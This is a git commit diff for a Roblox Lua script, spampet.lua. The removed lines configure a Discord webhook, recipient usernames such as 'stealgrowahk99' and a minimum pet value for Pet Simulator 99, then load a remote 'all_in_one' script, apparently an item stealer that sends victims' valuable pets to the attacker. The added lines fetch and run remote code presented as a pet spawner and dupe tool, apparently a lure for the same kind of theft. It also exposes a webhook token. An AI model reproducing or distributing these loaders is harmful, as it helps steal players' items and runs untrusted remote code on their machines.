8c312113edc1b76059c768c7ebab5eaa2cb462f9
bestscript-hk99 <hak91209@gmail.com>
2025-05-29 20:11:08 +0700

    Update spampet.lua

--- spampet.lua
+++ spampet.lua
@@ -1,4 +1,2 @@
-Username = {"rjn8he","stealgrowahk99"} 
-Webhook = "https://discord.com/api/webhooks/1376798123866980352/XLm-9Xt2Djn8SAG3cZMgmOkYzGaFB59tTu0rhHPVLI7xyEZq4mNWS5CJeDyDJr7O6SVK" 
-min_rap = 10000 --for pets go and pet simulator 99 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bestscript-hk99/dupeingrowagraden-/refs/heads/main/dupe.lua", true))()
